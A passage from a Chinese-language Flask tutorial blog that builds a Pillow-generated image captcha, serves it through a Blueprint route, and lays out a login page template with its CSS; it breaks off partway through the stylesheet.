class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成颜色</span>@classmethod<span class="token keyword">def</span> <span class="token function">__gene_rnd_color_1</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span>   <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>@classmethod<span class="token keyword">def</span> <span class="token function">__gene_rnd_color_2</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span>  <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成验证码</span><span class="token comment" spellcheck="true"># 使用类方法</span>@classmethod<span class="token keyword">def</span> <span class="token function">gene_graph_captcha</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 验证码高和宽</span>  width<span class="token punctuation">,</span> height <span class="token operator">=</span> cls<span class="token punctuation">.</span>size  <span class="token comment" spellcheck="true"># 创建图片</span>  image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 验证码字体</span>  font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'./Hack-Regular.ttf'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建画笔</span>  draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 填充</span>  <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> y <span class="token keyword">in</span> range<span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>          draw<span class="token punctuation">.</span>point<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>cls<span class="token punctuation">.</span>__gene_rnd_color_1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 输出文字</span>  <span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># 第一个参数是文本的左上角</span>      temp <span class="token operator">=</span> cls<span class="token punctuation">.</span>__gene_rnd_char<span class="token punctuation">(</span><span class="token punctuation">)</span>      draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token number">30</span><span class="token operator">*</span>t <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> temp<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>cls<span class="token punctuation">.</span>__gene_rnd_color_2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 模糊</span>  image <span class="token operator">=</span> image<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>GaussianBlur<span class="token punctuation">(</span>radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>text<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>img <span class="token operator">=</span> Captcha<span class="token punctuation">.</span>gene_graph_captcha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>img<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'code.png'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意: 字体文件我是放在了<code>captcha</code>的目录下的.</p><p>如果你要使用系统的字体,</p><ul><li><code>Ubuntu</code>系统个人字体位于:<code>~/.local/share/fonts</code>,系统字体位于:<code>/usr/share/fonts/</code></li></ul></blockquote><h3 id="5-生成蓝图Blueprint"><a href="#5-生成蓝图Blueprint" class="headerlink" title="5.生成蓝图Blueprint"></a>5.生成蓝图<code>Blueprint</code></h3><blockquote><p>创建一个<code>common</code>文件夹,存放蓝图文件.这里把创建验证码的功能放在<code>common/bp_captcha.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Blueprint<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> utils<span class="token punctuation">.</span>captcha <span class="token keyword">import</span> Captcha<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> jsonbp <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'common'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/common/'</span><span class="token punctuation">)</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'hello'</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/graph_capture/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">graph_capture</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> text<span class="token punctuation">,</span> image <span class="token operator">=</span> Captcha<span class="token punctuation">.</span>gene_graph_captcha<span class="token punctuation">(</span><span class="token punctuation">)</span> temp <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'temp.json'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>     f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#  验证码图片以二进制形式写入内存，防止图片都放在文件夹中，占用磁盘空间</span> out <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span> image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span> out<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>out<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> resp<span class="token punctuation">.</span>content_type <span class="token operator">=</span> <span class="token string">'image/png'</span>    <span class="token keyword">return</span> resp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:因为此阶段还没有学习到<code>flask session</code>,这里先把验证码放入到了一个文件中.</p><p>注意在主<code>app.py</code>中注册<code>Blueprint</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-修改login-html"><a href="#6-修改login-html" class="headerlink" title="6.修改login.html"></a>6.修改<code>login.html</code></h3><blockquote><p>适用<code>HTML+CSS</code>写一个登录的页面.</p><p><code>logo.png</code>是<code>blog</code>的图标,你要根据自己的需求创建一个自己的<code>logo</code></p><hr><p>这里就要把所有的<code>css\js\image</code>等等创建在<code>static</code>中.</p><pre class="line-numbers language-bash"><code class="language-bash">❯ tree<span class="token keyword">.</span>├── app.py├── config.py├── __pycache__│   └── config.cpython-37.pyc├── static│   ├── CSS│   ├── IMAGE│   └── JS└── templates └── login.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Login Wenyan.online<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>CSS/base.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>IMAGE/logo.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_top_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 Sign in to wenyan.onlie             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_main_center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_first<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_first_word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     Username or Email                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_second<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_third<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_third_word1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     Password                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_third_word2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Forgot password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_fourth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_fifth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_third_word1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     Verification                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_fifth_word1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>flush<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Flush<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_sixth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>veriification code<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_sixth_img<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>common.graph_capture<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>v_code<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ver_code<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_seventh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_seventh_button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sign in<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_container_foot<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_foot_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_main_eighth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_eighth_word1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     New to  wenyan.online                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div_eighth_word2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Create an account<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下是<code>base.css</code></p><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/** @Author: wenyan*/</span><span class="token selector">body</span><span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token 